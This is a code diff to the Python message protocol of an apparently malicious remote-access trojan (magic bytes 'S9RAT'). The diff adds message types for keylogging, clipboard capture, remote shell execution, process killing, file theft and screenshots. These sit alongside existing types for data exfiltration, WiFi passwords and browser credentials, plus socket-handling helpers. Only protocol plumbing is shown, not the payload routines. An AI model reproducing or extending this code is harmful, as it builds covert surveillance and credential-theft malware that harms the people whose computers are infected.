@@ -4,7 +4,7 @@ import struct
 import hashlib
 import os
 
-PROTOCOL_VERSION = 1
+PROTOCOL_VERSION = 2
 DEFAULT_PORT = 5555
 MAGIC = b"S9RAT"
 
@@ -15,21 +15,41 @@ MSG_TYPES = {
     "SCREEN_FRAME": 10,
     "SCREEN_START": 11,
     "SCREEN_STOP": 12,
+    "SCREEN_SELECT": 13,
+    "SCREEN_MONITORS": 14,
     "CONTROL_ENABLE": 20,
     "CONTROL_DISABLE": 21,
     "CONTROL_INPUT": 22,
-    "KEYBOARD_INPUT": 23,
-    "MOUSE_INPUT": 24,
     "EXFIL_DATA": 30,
     "EXFIL_REQUEST": 31,
     "FILE_LIST": 32,
     "FILE_TRANSFER": 33,
+    "FILE_TRANSFER_DATA": 34,
+    "FILE_TRANSFER_END": 35,
+    "FILE_DOWNLOAD": 36,
+    "FILE_BROWSE": 37,
+    "SCREENSHOT": 38,
     "SYSTEM_INFO": 40,
     "WIFI_PASSWORDS": 41,
     "BROWSER_CREDS": 42,
     "HEARTBEAT": 50,
     "HEARTBEAT_ACK": 51,
     "DISCONNECT": 60,
+    "SHUTDOWN": 70,
+    "RESTART": 71,
+    "LOGOFF": 72,
+    "SHELL_EXEC": 80,
+    "SHELL_OUTPUT": 81,
+    "PROCESS_LIST": 82,
+    "PROCESS_DATA": 83,
+    "PROCESS_KILL": 84,
+    "KEYLOG_START": 90,
+    "KEYLOG_STOP": 91,
+    "KEYLOG_DATA": 92,
+    "CLIPBOARD_GET": 93,
+    "CLIPBOARD_DATA": 94,
+    "CHAT_SEND": 95,
+    "CHAT_DISPLAY": 96,
 }
 
 
@@ -40,14 +60,20 @@ def pack_message(msg_type: str, data: dict) -> bytes:
     return header + msg_bytes
 
 
+def pack_frame(frame_data: bytes) -> bytes:
+    type_id = MSG_TYPES["SCREEN_FRAME"]
+    header = MAGIC + struct.pack("!BI", type_id, len(frame_data))
+    return header + frame_data
+
+
 def recv_exact(sock, n: int) -> bytes:
-    buf = b""
+    buf = bytearray()
     while len(buf) < n:
-        chunk = sock.recv(n - len(buf))
+        chunk = sock.recv(min(n - len(buf), 65536))
         if not chunk:
             raise ConnectionError("Connection closed")
-        buf += chunk
-    return buf
+        buf.extend(chunk)
+    return bytes(buf)
 
 
 def recv_message(sock) -> tuple[str, dict]:
@@ -69,12 +95,13 @@ def recv_message(sock) -> tuple[str, dict]:
     return msg_type, json.loads(msg_bytes.decode("utf-8"))
 
 
-def compute_file_hash(filepath: str) -> str:
-    h = hashlib.sha256()
-    with open(filepath, "rb") as f:
-        while True:
-            chunk = f.read(8192)
-            if not chunk:
-                break
-            h.update(chunk)
-    return h.hexdigest()
+def recv_raw(sock, n: int) -> bytes:
+    return recv_exact(sock, n)
+
+
+def set_nodelay(sock):
+    try:
+        import socket as _socket
+        sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
+    except Exception:
+        pass
